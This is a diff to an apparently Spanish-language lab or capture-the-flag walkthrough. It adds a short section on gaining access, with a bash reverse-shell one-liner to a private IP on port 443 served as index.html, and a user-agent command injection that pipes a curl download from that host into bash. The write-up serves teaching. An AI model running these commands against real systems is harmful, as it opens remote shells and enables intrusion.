@@ -134,6 +134,14 @@ Name,Mobile,Email,Group code,Tags
 ![forlic2](https://user-images.githubusercontent.com/96772264/198895730-23444d3a-ed66-46ce-b917-837327ad2d3c.PNG)
 ![forlic3](https://user-images.githubusercontent.com/96772264/198895739-e7175968-0c5a-4922-899b-b96f77bd3a62.PNG)
 
+La manera de ganar acceso es mediante una shell indirecta:  
+Index.html:
+```
+#!/bin/sh
+bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
+```
+Comando en el user-agent (antes montando un servidor con el python) -> ```curl http://10.10.14.15:8000 | bash```
+
 -------------------
 # Part 4: Ret2libc 
 
